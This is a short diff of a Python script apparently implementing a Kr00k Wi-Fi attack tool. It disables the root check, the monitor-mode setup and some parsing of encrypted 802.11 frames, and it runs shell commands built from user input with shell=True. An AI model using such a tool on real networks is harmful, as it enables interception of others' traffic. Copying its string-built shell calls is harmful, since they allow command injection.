@@ -51,9 +51,9 @@ class KR00K:
 
         if pkt.haslayer(Dot11CCMP):
             try:
-                qos = pkt[Dot11QoS]
-                ccmp = pkt[Dot11CCMP]
-                fcs = pkt[Dot11FCS]
+                #qos = pkt[Dot11QoS]
+                #ccmp = pkt[Dot11CCMP]
+                #fcs = pkt[Dot11FCS]
                 addr1 = re.sub(":","",pkt.addr1)
                 addr2 = re.sub(":","",pkt.addr2)
                 addr3 = re.sub(":","",pkt.addr3)
@@ -126,16 +126,16 @@ def main():
 
 
         kr00k = KR00K(options)
-    #    if os.getuid() != 0:
-     #       kr00k.ERROR("please run as root")
-      #      exit(0)
+        #if os.getuid() != 0:
+        #    kr00k.ERROR("please run as root")
+        #    exit(0)
         kr00k.INFO("killing processes that could cause trouble. (airmon-ng check kill)")
         run(['airmon-ng check kill'], shell=True, stdout=PIPE)
         # interface_mode: CompletedProcess = run(['iwconfig ' + options.interface], shell=True, stdout=PIPE)
-        kr00k.INFO("initiating monitor mode")
-        run(['airmon-ng start ' + options.interface], shell=True, stdout=PIPE)
-        kr00k.INFO("switching to specified channel")
-        run(['iwconfig ' + options.interface + ' channel ' + str(options.channel)], shell=True, stdout=PIPE)
+        #kr00k.INFO("initiating monitor mode")
+        #run(['airmon-ng start ' + options.interface], shell=True, stdout=PIPE)
+        #kr00k.INFO("switching to specified channel")
+        #run(['iwconfig ' + options.interface + ' channel ' + str(options.channel)], shell=True, stdout=PIPE)
         kr00k.INFO("engaging")
         # spinner = spinning_cursor()
         # for _ in range(50):
